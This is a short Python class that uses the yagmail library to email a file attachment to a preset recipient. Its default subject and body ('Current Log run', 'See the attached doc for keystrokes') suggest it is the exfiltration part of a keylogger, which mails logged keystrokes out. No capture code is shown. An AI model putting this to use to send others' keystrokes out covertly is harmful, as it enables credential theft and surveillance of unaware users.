# import used to send emails
import yagmail

class Email:
    """
    Class used to send emails using a specified email domain
    """
    def __init__(self, my_email, to_email):
        self.my_email = my_email  # sender
        self.to_email = to_email  # recepient email

    def send_email_with_file(self, filename, this_subj="Current Log run", body="See the attached doc for keystrokes", ):
        """
        Sends email to email to the log email specified in the program
        """
        yag = yagmail.SMTP(self.my_email)
        yag.send(
            to=self.to_email,
            subject=this_subj,
            contents=body, 
            attachments=filename,
        )